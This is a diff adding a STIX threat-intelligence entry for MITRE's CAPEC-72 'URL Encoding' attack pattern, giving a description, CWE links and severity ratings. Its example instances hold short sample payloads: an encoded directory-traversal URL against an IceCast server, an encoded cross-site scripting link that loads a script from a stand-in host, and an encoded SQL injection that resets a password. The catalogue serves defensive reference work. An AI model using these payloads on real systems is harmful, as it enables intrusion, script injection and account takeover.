@@ -1,0 +1,80 @@
+{
+    "type": "attack-pattern",
+    "id": "attack-pattern--4f54def5-a943-410d-be59-5aecc54f91b4",
+    "created_by_ref": "identity--d922e967-ff9b-4f27-97e6-2fc5f54aac51",
+    "created": "2018-03-05T19:06:11.784Z",
+    "modified": "2018-03-05T19:06:11.784Z",
+    "name": "URL Encoding",
+    "description": "This attack targets the encoding of the URL. An attacker can take advantage of the multiple way of encoding an URL and abuse the interpretation of the URL. An URL may contain special character that need special syntax handling in order to be interpreted. Special characters are represented using a percentage character followed by two digits representing the octet code of the original character (%HEX-CODE). For instance US-ASCII space character would be represented with %20. This is often referred as escaped ending or percent-encoding. Since the server decodes the URL from the requests, it may restrict the access to some URL paths by validating and filtering out the URL requests it received. An attacker will try to craft an URL with a sequence of special characters which once interpreted by the server will be equivalent to a forbidden URL. It can be difficult to protect against this attack since the URL can contain other format of encoding such as UTF-8 encoding, Unicode-encoding, etc. The attacker could also subvert the meaning of the URL string request by encoding the data being sent to the server through a GET request. For instance an attacker may subvert the meaning of parameters used in a SQL request and sent through the URL string (See Example section).",
+    "external_references": [
+        {
+            "source_name": "capec",
+            "url": "https://capec.mitre.org/data/definitions/72.html",
+            "external_id": "CAPEC-72"
+        },
+        {
+            "source_name": "cwe",
+            "url": "http://cwe.mitre.org/data/definitions/173.html",
+            "external_id": "CWE-173"
+        },
+        {
+            "source_name": "cwe",
+            "url": "http://cwe.mitre.org/data/definitions/177.html",
+            "external_id": "CWE-177"
+        },
+        {
+            "source_name": "cwe",
+            "url": "http://cwe.mitre.org/data/definitions/171.html",
+            "external_id": "CWE-171"
+        },
+        {
+            "source_name": "cwe",
+            "url": "http://cwe.mitre.org/data/definitions/172.html",
+            "external_id": "CWE-172"
+        },
+        {
+            "source_name": "cwe",
+            "url": "http://cwe.mitre.org/data/definitions/73.html",
+            "external_id": "CWE-73"
+        },
+        {
+            "source_name": "cwe",
+            "url": "http://cwe.mitre.org/data/definitions/21.html",
+            "external_id": "CWE-21"
+        },
+        {
+            "source_name": "cwe",
+            "url": "http://cwe.mitre.org/data/definitions/74.html",
+            "external_id": "CWE-74"
+        },
+        {
+            "source_name": "cwe",
+            "url": "http://cwe.mitre.org/data/definitions/20.html",
+            "external_id": "CWE-20"
+        }
+    ],
+    "object_marking_refs": [
+        "marking-definition--068ab041-90bb-4e30-9394-d306c62765a6"
+    ],
+    "x_capec_abstraction": "Detailed",
+    "x_capec_consequences": {
+        "Denial of Service": "DoS: resource consumption (memory)",
+        "Run Arbitrary Code": "Execute unauthorized code or commands"
+    },
+    "x_capec_example_instances": [
+        "Attack Example: URL Encodings in IceCast MP3 Server.\n\thttp://[targethost]:8000/somefile/%2E%2E/target.mp3\nThe following type of encoded string has been known traverse directories against the IceCast MP3 server9:\n\t\"/%25%25/\" instead of \"/../\".\nor using\nThe control character \"..\" can be used by an attacker to escape the document root.",
+        "Cross-Site Scripting\n\thttp://target/getdata.php?data=%3cscript%20src=%22http%3a%2f%2fwww.badplace.com%2fnasty.js%22%3e%3c%2fscript%3e\n[R.72.3][REF-35]\n\t<script src=\"http://www.badplace.com/nasty.js\"></script>",
+        "SQL Injection\n\tSQLQuery = \"SELECT preferences FROM logintable WHERE userid='\" & Request.QueryString(\"userid\") & \"' AND password='\" & Request.QueryString(\"password\") & \"';\"\nFrom \"URL encoded attacks\", by Gunter Ollmann - http://www.cgisecurity.com/lib/URLEmbeddedAttacks.html\n\thttp://target/login.asp?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00\n\tSELECT preferences FROM logintable WHERE userid='bob'; update logintable set password='0wn3d';"
+    ],
+    "x_capec_likelihood_of_attack": "High",
+    "x_capec_prerequisites": [
+        "The application should accepts and decodes URL input.",
+        "The application performs insufficient filtering/canonicalization on the URLs."
+    ],
+    "x_capec_skills_required": {
+        "The attacker may write a script to defeat the input filtering mechanism.": "Medium",
+        "An attacker can try special characters in the URL and bypass the URL validation.": "Low"
+    },
+    "x_capec_typical_severity": "High",
+    "x_resources_required": ""
+}
